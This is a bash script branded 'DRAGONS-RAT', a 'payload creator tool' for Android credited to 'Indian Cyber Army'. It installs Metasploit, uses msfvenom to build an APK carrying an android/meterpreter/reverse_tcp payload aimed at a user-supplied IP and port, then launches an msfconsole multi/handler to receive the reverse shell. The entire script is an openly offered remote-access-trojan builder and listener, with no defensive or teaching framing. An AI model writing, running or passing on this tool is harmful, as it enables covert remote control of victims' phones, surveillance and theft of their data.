#!/bin/bash
echo "Checking For Root User...."
sleep 1
if [[ $(id -u) -ne 0 ]] ; then 
   echo "You are Not Root! Please Run as root" ; exit 1 ; 
else echo "Checking For Requirement Packages.." ; 
fi


pkgs=(metasploit-framework apache2)
for pkg in ${pkgs[@]}
do
 sudo apt install $pkg
done
sleep 1
clear

echo "Required Packages Has Been Installed Sucessfully"


clear
cat<< EOF
      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ 
     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|
     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  
     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  
     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  
                                                                           
     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________
                               
                               FOR ANDROID ONLY
                           MADE BY: INDIAN CYBER ARMY                  
            YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5 
         
         
EOF
read -p " a) Create a payload
 b) Execute the listener for previous R.A.T
 enter a or b (Default a) ===> " ab
case $ab in
a) echo Creating a payload ...;;
b) echo Executing the listener ...;
bash src/src.sh

esac

read -p "    Enter your IP Address ===> " ip
read -p "    Enter listener port ===> " Port  
read -p "|---Enter the name or path to save the payload
|----> " Path               
msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$Port - apk -o $Path
clear
cat<< EOF
      ____  ____      _    ____  ___  _   _ ____        ____      _  _____ 
     |  _ \|  _ \    / \  / ___|/ _ \| \ | / ___|      |  _ \    / \|_   _|
     | | | | |_) |  / _ \| |  _| | | |  \| \___ \ _____| |_) |  / _ \ | |  
     | |_| |  _ <  / ___ \ |_| | |_| | |\  |___) |_____|  _ <  / ___ \| |  
     |____/|_| \_\/_/   \_\____|\___/|_| \_|____/      |_| \_\/_/   \_\_|  
                                                                           
     ____________________A SIMPLE PAYLOAD CREATOR TOOL_____________________
                               
                               FOR ANDROID ONLY
                           MADE BY: INDIAN CYBER ARMY                  
            YOUTUBE CHANNEL: https://www.youtube.com/@indiancyberarmy5 
         
         
EOF
read -p "Do you want to Execute the listener?
 y) Execute the listener
 n) Exit 
 enter y or n (Default y) ===> " yn
case $yn in
y) echo Executing the listener ...;;
n) echo exiting ...;
sleep 1
exit 1

esac
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $Port; exploit;"
